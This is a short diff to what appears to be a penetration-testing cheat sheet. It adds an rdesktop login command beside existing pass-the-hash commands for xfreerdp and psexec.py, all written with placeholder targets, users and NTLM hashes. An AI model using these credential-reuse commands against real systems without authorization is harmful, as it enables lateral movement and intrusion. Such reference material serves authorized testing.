@@ -388,6 +388,12 @@ Connect to RDP using Pass the Hash (PtH):
 xfreerdp /v:[TARGET-IP] /u:[DOMAIN]\\[USERNAME] /pth:[NTLM-HASH]
 ```
 
+### rdesktop 
+
+```
+rdesktop  [TARGET-IP] -u [USERNAME] -p [PASSWORD] -d [DOMAIN]
+```
+
 ### Connect via psexec using Pass the Hash
 ```
 psexec.py -hashes [NTLM-HASH] [DOMAIN]/[USERNAME]@[TARGET-IP]
